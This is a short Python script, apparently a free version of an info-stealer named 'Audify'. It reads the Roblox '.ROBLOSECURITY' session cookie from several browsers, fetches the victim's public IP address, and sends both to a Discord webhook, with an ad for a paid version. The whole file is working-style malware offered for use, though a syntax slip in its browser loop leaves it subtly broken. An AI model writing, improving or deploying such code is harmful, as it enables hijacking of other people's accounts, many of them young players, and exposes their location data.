import os
from discordwebhook import Discord
import requests
import browser_cookie3


webhook = ""

if __name__ == "__main__":
    ip = requests.get("https://api.ipify.org").text
    def Log():

        data = [] 

        try:
            for browser in ["brave", "edge", "firefox", "chrome", "chromium", "opera"]
            cookies = eval(f"browser_cookie3.{browser}(domain_name='roblox.com')")
            for cookie in cookies:
                if cookie.name == '.ROBLOSECURITY':
                    data.append(cookies)
                    data.append(cookie.value)
                    return data[1]
        except:
            pass

    roblox = Log()

    if roblox == None:
        roblox = "No Roblox Cookie Found"





    discord = Discord(url=webhook)
    discord.post(
        username="BOT - Audify (FREE VERSION) 🍪",
        avatar_url="https://media.discordapp.net/attachments/1090956626330144868/1091777808243622038/133-1332078_the-openui5-icon-comes-in-2-flavors-black.png?width=576&height=580g",
        embeds=[
            {
                "username": "BOT - Audify (FREE VERSION) 🍪",
                "title" : "Press Here To Buy Paid Version",
                "author": {
                "name": f"Audify Has Logged Someone!",
                "icon_url": "https://cdn-icons-png.flaticon.com/512/5968/5968968.png",
                },
                "url" : "https://discord.gg/h8TGb3xDje",
                "description" : f"",
                "color" : 16711680,
                "fields": [
                    {"name": "Roblox Cookie", "value": f"```{roblox}```", "inline": False},
                    {"name": "IP Address", "value": f"**`{ip}`**","inline": False},
                    

                ],
                "thumbnail": {"url": "https://media.discordapp.net/attachments/1090955582413996064/1092084616434827294/pcmkNdRdBGCDPaN.png?width=772&height=579"}


            },
            
            
        ],
    )